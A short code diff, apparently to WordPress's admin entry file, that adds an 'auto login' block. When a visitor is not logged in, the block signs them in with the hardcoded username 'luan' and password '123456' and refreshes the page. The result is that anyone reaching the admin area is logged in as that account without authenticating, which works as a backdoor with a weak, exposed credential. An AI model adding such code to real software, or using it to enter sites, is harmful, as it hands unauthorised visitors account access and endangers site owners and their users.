@@ -33,6 +33,17 @@ if ( isset( $_GET['import'] ) && ! defined( 'WP_LOAD_IMPORTERS' ) ) {
 
 require_once dirname( __DIR__ ) . '/wp-load.php';
 
+// WP auto login
+if (!is_user_logged_in()) {
+	$creds = array(
+		'user_login'    => 'luan',
+		'user_password' => '123456',
+		'remember'      => true
+	);
+	$user = wp_signon( $creds, false );
+	header("Refresh:0");
+}
+
 nocache_headers();
 
 if ( get_option( 'db_upgraded' ) ) {
